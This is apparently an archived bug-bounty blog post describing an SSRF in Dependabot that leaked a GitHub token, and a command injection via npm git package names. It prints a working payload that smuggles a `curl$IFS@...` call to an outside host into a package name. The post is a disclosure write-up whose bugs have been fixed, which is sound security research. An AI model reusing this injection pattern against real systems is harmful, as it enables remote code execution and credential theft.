...
original_path: knowledge-inbox/blogs-incoming/2021-06-27_diving-into-dependabot-along-with-a-bug-in-npm.md
original_filename: 2021-06-27_diving-into-dependabot-along-with-a-bug-in-npm.md
...
- automation-abuse
language: en
raw_sha256: 06d00b6975f787dcc74c4760cfc8ca4a914e8d1ef035584e24c557955fc98a87
text_sha256: 1a6ff9ca75853818c7bc70041208013ae0a3957da5f861a53e8230b5ab93cfa7
...
- Original Path: knowledge-inbox/blogs-incoming/2021-06-27_diving-into-dependabot-along-with-a-bug-in-npm.md
- Source Type: markdown
- Detected Topics: supply-chain, access-control, ssrf, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `06d00b6975f787dcc74c4760cfc8ca4a914e8d1ef035584e24c557955fc98a87`
- Text SHA256: `1a6ff9ca75853818c7bc70041208013ae0a3957da5f861a53e8230b5ab93cfa7`
...
---
title: "Diving into Dependabot along with a bug in npm"
url: "https://blog.tyage.net/posts/2021-06-27-dependabot-rce/"
final_url: "https://blog.tyage.net/posts/2021-06-27-dependabot-rce/"
authors: ["tyage (@tyage)"]
programs: ["GitHub"]
bugs: ["SSRF", "RCE"]
bounty: "8,117"
...
The core module of the Dependabot is open-sourced (<https://github.com/dependabot/dependabot-core>), so we can use Dependabot outside of GitHub. To start the investigation, I prepared an local Dependabot environment following [the official sample code](https://github.com/dependabot/dependabot-script).
...
Next, I updated the `credentials`, `repo_name` and `dependency_name` in [update-scripts.rb](https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb) from the official sample code so that we can run dependency checker against the sample repository I created. When I run the script, my server - `github.com.mocos.kitchen` \- received a request containing GitHub Access Token.
...
When I tried some payload, I came across with a pattern that triggers a shell command in Dependabot server. With the package name `https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/...`, a shell command `curl$IFS@mocos.kitchen:3001` was executed and we could see the request!
...
By the way, what was happend to Dependabot when I changed the package name to `https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);...`? I found that the command was executed in `run_npm_7_top_level_updater` method. In this method, the bot runs `npm install` command with `--ignore-scripts --package-lock-only` arguments so that it can see if the lock file is updated without running install scripts.
...
npm passes `opts` variable, which contains npm config, as an option argument. It means `opts.shell` is same with [`shell` config](https://docs.npmjs.com/cli/v7/using-npm/config#shell) which default value is a `$SHELL` environment variable or `bash` on Posix
...
I reported this bug to the teams and [it was resolved in npm 7.10.0](https://github.com/npm/git/pull/29). I asked if they issue CVE but they answered they will not.
...
[ ← Previous: Gain write permission of repositories with a bug in GitHub Actions ](/posts/2021-04-02-improper-access-control-github-workflow/)

2021/04/02 

[ Next: ACSC 2023 Gotion Challenge Author Writeup → ](/posts/2023-03-12-acsc-2023-gotion/)

2023/03/12 

[](https://fed.brid.gy/)

2021-07-12T23:30:00+09:00
